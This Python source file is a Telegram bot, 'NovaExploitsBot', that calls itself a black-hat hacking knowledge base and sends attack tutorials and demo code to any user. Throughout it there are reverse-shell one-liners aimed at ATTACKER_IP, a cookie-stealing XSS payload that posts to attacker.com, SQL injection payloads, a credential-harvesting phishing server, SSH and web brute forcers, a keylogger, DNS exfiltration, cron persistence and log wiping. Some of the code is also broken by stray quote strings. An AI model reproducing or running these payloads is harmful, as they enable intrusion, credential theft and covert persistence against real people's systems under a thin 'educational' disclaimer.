#!/usr/bin/env python3
"""
NovaExploitsBot - Educational Hacking Knowledge Base Bot
Authorized penetration testing educational tool
Built with pyTelegramBotAPI
"""

import os
import sys
import json
import subprocess
import platform
import telebot
from telebot import types

# ==================== CONFIGURATION ====================
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
AUTHORIZED_USERS = []  # Empty = anyone can use. Add Telegram user IDs to restrict.

# ==================== INIT BOT ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ==================== KNOWLEDGE BASE ====================
# Each topic: demo code + tutorial explanation
TOPICS = {
    "recon": {
        "title": "🔍 Reconnaissance / OSINT",
        "description": "Information gathering techniques",
        "commands": [
            "nmap", "whois", "theHarvester", "sublist3r", "dnsrecon", "whatweb"
        ],
        "demo": """```python
import subprocess
import json

# Example: Subdomain enumeration using sublist3r
def subdomain_enum(domain):
    cmd = f"sublist3r -d {domain} -o subdomains.txt"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

# Example: DNS reconnaissance
def dns_recon(domain):
    cmd = f"dnsrecon -d {domain} -t std"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

# Example: HTTP header analysis
def http_headers(url):
    import requests
    resp = requests.get(url)
    return dict(resp.headers)

print("[+] Subdomains saved to subdomains.txt")
print("[+] DNS records enumerated")
print("[+] HTTP headers captured")
```""",
        "tutorial": """<b>🔍 RECONNAISSANCE TUTORIAL</b>

<b>Purpose:</b> Gather information about target before attacking.

<b>Tools & Usage:</b>

1️⃣ <code>nmap -sV -sC target.com</code>
   - Service version detection + default scripts
   - Identifies open ports & running services

2️⃣ <code>theHarvester -d target.com -b google,linkedin</code>
   - Email harvesting, subdomains, IPs

3️⃣ <code>sublist3r -d target.com</code>
   - Fast subdomain enumeration via search engines

4️⃣ <code>dnsrecon -d target.com -t std</code>
   - DNS record enumeration (A, MX, NS, TXT, SOA)

5️⃣ <code>whatweb target.com</code>
   - Web technology fingerprinting

<b>OSINT Sources:</b>
• Shodan.io - IoT/device search
• Censys.io - Certificate transparency
• Wayback Machine - Historical pages
• HaveIBeenPwned - Credential leaks

<b>💡 Pro Tip:</b> Always start passive (OSINT) before active scanning to avoid detection."""
    },
    "sql_injection": {
        "title": "💉 SQL Injection",
        "description": "Database exploitation techniques",
        "demo": """```python
import requests

# SQL Injection detection payloads
payloads = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "' OR 1=1-- -",
    "admin' --",
    "' WAITFOR DELAY '00:00:05'--",
]

def test_sqli(url, param):
    for payload in payloads:
        params = {param: payload}
        try:
            r = requests.get(url, params=params, timeout=5)
            if any(x in r.text.lower() for x in ['sql', 'mysql', 'error', 'syntax']):
                print(f"[!] Vulnerable: {param}={payload}")
        except:
            pass

# SQLMap automation
def sqlmap_auto(url):
    cmd = f"sqlmap -u '{url}' --batch --dbs --random-agent"
    subprocess.run(cmd, shell=True)

print("[+] SQLMap ready for database enumeration")
print("[+] Payload list loaded (%d payloads)" % len(payloads))
```""",
        "tutorial": """<b>💉 SQL INJECTION TUTORIAL</b>

<b>Purpose:</b> Manipulate database queries via input fields.

<b>Types:</b>
• <b>In-band:</b> Error-based, Union-based (data in response)
• <b>Blind:</b> Boolean-based, Time-based (no visible data)

<b>Manual Testing:</b>
1. Find input fields (login, search, URL params)
2. Test: <code>'</code> -> error = vulnerable
3. Test: <code>' OR 1=1--</code> -> bypass login
4. Test: <code>' UNION SELECT 1,2,3--</code> -> find columns

<b>Automation (SQLMap):</b>
<code>sqlmap -u "http://target.com/page?id=1" --batch --dbs</code>
<code>sqlmap -u "http://target.com/page?id=1" -D dbname --tables</code>
<code>sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump</code>

<b>💡 Pro Tip:</b> Use <code>--random-agent</code> and <code>--delay=1</code> to avoid WAF detection."""
    },
    "xss": {
        "title": "🌐 Cross-Site Scripting (XSS)",
        "description": "Client-side injection attacks",
        "demo": """```python
import requests
import urllib.parse

# XSS payload generator
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "'-alert(1)-'",
]

def test_xss(url, param):
    results = []
    for payload in xss_payloads:
        encoded = urllib.parse.quote(payload)
        params = {param: encoded}
        try:
            r = requests.get(url, params=params, timeout=5)
            if payload in r.text or '<script>' in r.text:
                results.append((payload, "Reflected"))
                print(f"[!] XSS Found: {param}={payload}")
        except:
            pass
    return results

# Automated XSS scanner with XSStrike
def xsstrike_scan(url):
    cmd = f"xsstrike -u '{url}' --crawl"
    subprocess.run(cmd, shell=True)

print("[+] XSS scanner ready")
print("[+] Loaded %d payloads" % len(xss_payloads))
```""",
        "tutorial": """<b>🌐 XSS (CROSS-SITE SCRIPTING) TUTORIAL</b>

<b>Purpose:</b> Inject malicious scripts into web pages viewed by others.

<b>Types:</b>
• <b>Reflected:</b> Payload in URL, executed once
• <b>Stored:</b> Payload saved on server (comments, profiles)
• <b>DOM-based:</b> Client-side JS executes payload

<b>Basic Payloads:</b>
<code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
<code>&lt;img src=x onerror=alert(1)&gt;</code>
<code>&lt;svg/onload=alert(1)&gt;</code>

<b>Cookie Stealing Payload:</b>
<code>&lt;script&gt;fetch('http://attacker.com/?c='+document.cookie)&lt;/script&gt;</code>

<b>Tools:</b>
• <code>XSStrike</code> - Automated XSS detection
• <code>BeEF</code> - Browser Exploitation Framework
• <code>dalfox</code> - Fast param XSS scanner

<b>💡 Pro Tip:</b> Test in both URL params AND POST body. Use <code>&lt;script&gt;</code> filters bypass techniques."""
    },
    "reverse_shell": {
        "title": "🔄 Reverse Shell",
        "description": "Remote access to target machine",
        "demo": """```bash
#!/bin/bash
# Listener (attacker machine):
# nc -lvnp 4444

# Various reverse shell one-liners:

# Bash
# bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
# python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
# php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell (Windows)
# powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"

# Netcat (if available)
# nc -e /bin/sh ATTACKER_IP 4444
""" """,
        "tutorial": """<b>🔄 REVERSE SHELL TUTORIAL</b>

<b>Purpose:</b> Get interactive shell access on target.

<b>Setup Listener (Attacker):</b>
<code>nc -lvnp 4444</code>

<b>Common One-Liners:</b>

<b>Linux - Bash:</b>
<code>bash -i >& /dev/tcp/YOUR_IP/4444 0>&1</code>

<b>Linux - Python:</b>
<code>python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code>

<b>PHP:</b>
<code>php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</code>

<b>Windows PowerShell:</b>
<code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"</code>

<b>💡 Pro Tip:</b> Use <code>rlwrap nc -lvnp 4444</code> for better shell (arrow keys, tab completion)."""
    },
    "privilege_escalation": {
        "title": "⬆️ Privilege Escalation",
        "description": "Getting root/admin access",
        "demo": """```bash
#!/bin/bash
# Linux privilege escalation checks

echo "=== Kernel & OS Info ==="
uname -a
cat /etc/os-release 2>/dev/null

echo "=== Users & Groups ==="
cat /etc/passwd | grep -E "/(bin/bash|bin/sh)"
cat /etc/group
sudo -l 2>/dev/null

echo "=== SUID Binaries ==="
find / -perm -4000 -type f 2>/dev/null

echo "=== Writable /etc/passwd ==="
ls -la /etc/passwd
ls -la /etc/shadow

echo "=== Cron Jobs ==="
ls -la /etc/cron* 2>/dev/null
cat /etc/crontab 2>/dev/null

echo "=== Running Services ==="
ps aux --forest

echo "=== Network Connections ==="
netstat -tlnp 2>/dev/null || ss -tlnp

echo "=== Docker/LXC ==="
ls -la /var/run/docker.sock 2>/dev/null
cat /proc/1/cgroup | grep -i docker
""" """,
        "tutorial": """<b>⬆️ PRIVILEGE ESCALATION TUTORIAL</b>

<b>Purpose:</b> Escalate from low-priv shell to root/administrator.

<b>Linux Enumeration Checklist:</b>

1️⃣ <b>Kernel Exploits:</b>
<code>uname -a</code> → Search exploit-db for kernel version

2️⃣ <b>SUID Binaries:</b>
<code>find / -perm -4000 -type f 2>/dev/null</code>
Check GTFOBins for exploit methods

3️⃣ <b>Sudo Permissions:</b>
<code>sudo -l</code> → Check what you can run as sudo

4️⃣ <b>Writable Files:</b>
<code>find / -writable -type f 2>/dev/null | grep -v proc</code>

5️⃣ <b>Cron Jobs:</b>
<code>cat /etc/crontab</code> → Look for writable scripts

6️⃣ <b>Docker Escape:</b>
If in Docker: check <code>/var/run/docker.sock</code>

<b>Windows Enumeration:</b>
• <code>whoami /priv</code> - Check privileges
• <code>systeminfo</code> - OS details
• <b>WinPEAS</b> - Automated enumeration

<b>💡 Pro Tip:</b> Always run <code>LinPEAS</code> or <code>WinPEAS</code> for automated enumeration."""
    },
    "phishing": {
        "title": "🎣 Phishing & Social Engineering",
        "description": "Credential harvesting techniques",
        "demo": """```python
# Educational phishing page simulation
# Purpose: Understanding how phishing works

import http.server
import socketserver
import urllib.parse

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        credentials = urllib.parse.parse_qs(post_data.decode())
        
        print("[+] Captured credentials:")
        for key, value in credentials.items():
            print(f"    {key}: {value[0]}")
        
        # Save to file
        with open("captured.txt", "a") as f:
            f.write(str(credentials) + "\\n")
        
        # Redirect to real site
        self.send_response(302)
        self.send_header('Location', 'https://real-site.com')
        self.end_headers()

# Run HTTP server on port 8080
# with socketserver.TCPServer(("", 8080), PhishingHandler) as httpd:
#     print("[*] Phishing server running on port 8080")
#     httpd.serve_forever()

print("[!] Educational demo - Phishing server code")
print("[!] Never use for unauthorized targets")
""" """,
        "tutorial": """<b>🎣 PHISHING & SOCIAL ENGINEERING TUTORIAL</b>

<b>Purpose:</b> Trick users into revealing credentials.

<b>Common Techniques:</b>

1️⃣ <b>Clone & Host:</b>
• Clone a login page
• Host on similar domain (g00gle.com vs google.com)
• Harvest credentials server-side

2️⃣ <b>Evilginx / Modlishka:</b>
• Reverse proxy that captures 2FA tokens
• Sits between user and real website

3️⃣ <b>Social Engineering Vectors:</b>
• Email spoofing (SPF/DKIM bypass)
• SMS phishing (Smishing)
• Phone calls (Vishing)
• USB drop attacks

4️⃣ <b>Tools:</b>
• <code>SET (Social Engineering Toolkit)</code>
• <code>Evilginx2</code> - Reverse proxy phishing
• <code>Zphisher</code> - Automated phishing pages
• <code>Gophish</code> - Open-source framework

<b>💡 Pro Tip:</b> Use HTTPS with valid certs for realistic phishing pages. Let's Encrypt is free."""
    },
    "bruteforce": {
        "title": "🔑 Brute Force & Password Attacks",
        "description": "Cracking credentials",
        "demo": """```python
import requests
import itertools
import string

# SSH brute force with paramiko
def ssh_bruteforce(host, username, wordlist):
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for password in wordlist:
        try:
            client.connect(host, username=username, password=password, timeout=3)
            print(f"[+] Found: {username}:{password}")
            return password
        except:
            pass
    return None

# HTTP form brute force
def http_bruteforce(url, user_field, pass_field, username, wordlist):
    for password in wordlist:
        data = {user_field: username, pass_field: password.strip()}
        r = requests.post(url, data=data, timeout=5)
        if "incorrect" not in r.text.lower():
            print(f"[+] Possible creds: {username}:{password.strip()}")
            return password.strip()
    return None

# Hydra command equivalent
def hydra_cmd(target, service):
    cmd = f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} {service}"
    print(f"[*] Run: {cmd}")

print("[+] Brute force engine initialized")
print("[+] Wordlists: rockyou.txt, common.txt, SecLists")
""" """,
        "tutorial": """<b>🔑 BRUTE FORCE & PASSWORD ATTACKS TUTORIAL</b>

<b>Purpose:</b> Crack passwords through iterative guessing.

<b>Tools & Commands:</b>

<b>Hydra (Online):</b>
• SSH: <code>hydra -l root -P wordlist.txt ssh://target.com</code>
• FTP: <code>hydra -l admin -P wordlist.txt ftp://target.com</code>
• Web: <code>hydra -l admin -P wordlist.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"</code>

<b>John the Ripper (Offline):</b>
<code>john --wordlist=rockyou.txt hash.txt</code>

<b>Hashcat (GPU Accelerated):</b>
<code>hashcat -m 0 -a 0 hash.txt rockyou.txt</code>  # MD5
<code>hashcat -m 1000 -a 0 hash.txt rockyou.txt</code> # NTLM

<b>Wordlists:</b>
• <code>/usr/share/wordlists/rockyou.txt</code> (14M passwords)
• <code>SecLists</code> (GitHub)

<b>💡 Pro Tip:</b> Use <code>cewl</code> to scrape target website for custom wordlist generation."""
    },
    "post_exploitation": {
        "title": "🕵️ Post-Exploitation",
        "description": "Pivoting, persistence, data exfiltration",
        "demo": """```python
import os
import base64
import socket
import threading

# Keylogger (educational)
def keylogger_demo():
    try:
        from pynput import keyboard
    except:
        print("[!] Install: pip install pynput")
        return
        
    def on_press(key):
        try:
            with open("keystrokes.log", "a") as f:
                f.write(f"{key.char}")
        except:
            with open("keystrokes.log", "a") as f:
                f.write(f" [{key}] ")
    
    print("[*] Keylogger running... (demo only)")
    # listener = keyboard.Listener(on_press=on_press)
    # listener.start()

# Data exfiltration via DNS
def dns_exfil(data, domain):
    """Encode data in DNS queries"""
    encoded = base64.b64encode(data.encode()).decode()
    chunks = [encoded[i:i+30] for i in range(0, len(encoded), 30)]
    for chunk in chunks[:5]:  # Limit for demo
        query = f"{chunk}.{domain}"
        print(f"[*] DNS exfil: {query}")
        # socket.gethostbyname(query)

# Persistence via cron
def persistence_cron():
    cron_cmd = "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
    print(f"[*] Add to crontab:")
    print(f"    (crontab -l 2>/dev/null; echo '{cron_cmd}') | crontab -")

print("[+] Post-exploitation modules loaded")
""" """,
        "tutorial": """<b>🕵️ POST-EXPLOITATION TUTORIAL</b>

<b>Purpose:</b> Maintain access, extract data, move laterally.

<b>1. PERSISTENCE</b>

<b>Linux Cron:</b>
<code>(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'") | crontab -</code>

<b>SSH Authorized Keys:</b>
<code>echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys</code>

<b>Systemd Service:</b>
Create <code>/etc/systemd/system/backdoor.service</code>

<b>2. LATERAL MOVEMENT</b>
• <code>ssh</code> - If you find credentials
• <code>psql</code>, <code>mysql</code> - Database hopping
• <code>smbclient</code> - Windows shares

<b>3. DATA EXFILTRATION</b>
• DNS tunneling
• HTTP/HTTPS POST requests
• Encrypted archives via SCP

<b>4. TOOLS</b>
• <code>Meterpreter</code> (Metasploit)
• <code>Cobalt Strike</code> Beacon
• <code>Empire</code> PowerShell post-ex

<b>💡 Pro Tip:</b> Always clean logs: <code>cat /dev/null > ~/.bash_history && history -c</code>"""
    }
}

# ==================== COMMAND HANDLERS ====================

@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Welcome message with menu"""
    user = message.from_user.first_name
    
    welcome = f"""<b>🔥 NovaExploitsBot - Black Hat Hacking Knowledge Base</b>

Welcome, {user}! 

I provide <b>educational hacking tutorials + demo code</b> for authorized penetration testing.

<b>📚 Available Topics:</b>
"""
    for key, topic in TOPICS.items():
        welcome += f"\n/{key} — {topic['title']}\n   {topic['description']}"
    
    welcome += """

<b>⚠️ Disclaimer:</b> Just for educational purpose.Just for demo bot maintenance soon. This bot comming soon to play store.
Use <b>/start</b> to see this menu again.
"""
    
    # Create inline keyboard
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = []
    for key, topic in TOPICS.items():
        buttons.append(types.InlineKeyboardButton(topic['title'], callback_data=f"topic_{key}"))
    markup.add(*buttons)
    
    bot.send_message(message.chat.id, welcome, reply_markup=markup, parse_mode="HTML")


@bot.message_handler(commands=list(TOPICS.keys()))
def handle_topic(message):
    """Handle direct topic commands"""
    cmd = message.text.split()[0][1:]  # Remove '/' and get command
    
    if cmd in TOPICS:
        send_topic_content(message.chat.id, cmd)


@bot.message_handler(func=lambda msg: True)
def handle_text(message):
    """Handle any text - search for relevant topics"""
    query = message.text.lower()
    
    # Simple keyword matching
    keyword_map = {
        "recon": ["recon", "osint", "information", "gather", "enumeration", "nmap", "subdomain"],
        "sql_injection": ["sql", "injection", "sqli", "database", "mysql", "union", "sqlmap"],
        "xss": ["xss", "cross site", "scripting", "javascript", "cookie", "payload"],
        "reverse_shell": ["reverse", "shell", "backdoor", "remote", "connect", "nc", "netcat"],
        "privilege_escalation": ["privilege", "escalation", "privesc", "root", "admin", "suid", "sudo"],
        "phishing": ["phish", "phishing", "social", "engineer", "credential", "fake page"],
        "bruteforce": ["brute", "bruteforce", "crack", "password", "hash", "hydra", "john"],
        "post_exploitation": ["post", "exploit", "persist", "lateral", "exfil", "pivot", "keylog"]
    }
    
    matched = []
    for topic, keywords in keyword_map.items():
        for kw in keywords:
            if kw in query:
                matched.append(topic)
                break
    
    if matched:
        # Send the first matching topic
        send_topic_content(message.chat.id, matched[0])
        
        # If multiple matches, offer others
        if len(matched) > 1:
            markup = types.InlineKeyboardMarkup(row_width=2)
            buttons = []
            for topic in matched[1:]:
                buttons.append(types.InlineKeyboardButton(TOPICS[topic]['title'], callback_data=f"topic_{topic}"))
            markup.add(*buttons)
            bot.send_message(
                message.chat.id,
                "Also related topics:",
                reply_markup=markup
            )
    else:
        # No match - show menu
        markup = types.InlineKeyboardMarkup(row_width=2)
        buttons = []
        for key, topic in TOPICS.items():
            buttons.append(types.InlineKeyboardButton(topic['title'], callback_data=f"topic_{key}"))
        markup.add(*buttons)
        
        bot.send_message(
            message.chat.id,
            f"I didn't find a direct match for \"{message.text}\". Try one of these topics:",
            reply_markup=markup
        )


# ==================== CALLBACK HANDLERS ====================

@bot.callback_query_handler(func=lambda call: call.data.startswith("topic_"))
def handle_callback(call):
    """Handle inline keyboard button presses"""
    topic = call.data[6:]  # Remove "topic_"
    if topic in TOPICS:
        send_topic_content(call.message.chat.id, topic)
    bot.answer_callback_query(call.id)


# ==================== CONTENT SENDER ====================

def send_topic_content(chat_id, topic_key):
    """Send demo + tutorial for a topic"""
    topic = TOPICS[topic_key]
    
    # Send title + description
    header = f"<b>{topic['title']}</b>\n{topic['description']}\n\n📜 <b>Commands:</b> {', '.join(topic['commands'])}"
    bot.send_message(chat_id, header, parse_mode="HTML")
    
    # Send demo code
    demo_msg = f"<b>💻 DEMO CODE:</b>\n{topic['demo']}"
    bot.send_message(chat_id, demo_msg, parse_mode="Markdown")
    
    # Send tutorial
    bot.send_message(chat_id, topic['tutorial'], parse_mode="HTML")
    
    # Offer navigation
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = []
    other_topics = [k for k in TOPICS.keys() if k != topic_key]
    for t in other_topics[:4]:  # Limit to 4 buttons
        buttons.append(types.InlineKeyboardButton(TOPICS[t]['title'], callback_data=f"topic_{t}"))
    markup.add(*buttons)
    markup.add(types.InlineKeyboardButton("📋 Main Menu", callback_data="menu_main"))
    
    bot.send_message(chat_id, "Choose another topic:", reply_markup=markup)


@bot.callback_query_handler(func=lambda call: call.data == "menu_main")
def handle_main_menu(call):
    """Return to main menu"""
    handle_start(call.message)
    bot.answer_callback_query(call.id)


# ==================== ERROR HANDLER ====================

@bot.message_handler(func=lambda msg: False, content_types=['error'])
def handle_error(message):
    bot.reply_to(message, "An error occurred. Please try again.")


# ==================== AUTHORIZATION CHECK ====================

def is_authorized(message):
    """Check if user is authorized to use this bot"""
    if not AUTHORIZED_USERS:
        return True
    return message.from_user.id in AUTHORIZED_USERS


@bot.message_handler(func=lambda msg: not is_authorized(msg))
def unauthorized(message):
    bot.reply_to(message, "❌ You are not authorized to use this bot.")


# ==================== MAIN ====================

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════╗
    ║     NovaExploitsBot v1.0             ║
    ║  Educational Hacking Knowledge Base   ║
    ║  This is a deno bot,bot maintenance soon.Do not using any illegal activities||
    ╚══════════════════════════════════════╝
    """)
    
    if BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        print("[!] ERROR: Please set your BOT_TOKEN in the script!")
        print("[!] Get a token from @BotFather on Telegram")
        sys.exit(1)
    
    print("[+] Bot is running... Press Ctrl+C to stop.")
    try:
        bot.infinity_polling()
    except KeyboardInterrupt:
        print("\n[!] Bot stopped.")
        sys.exit(0)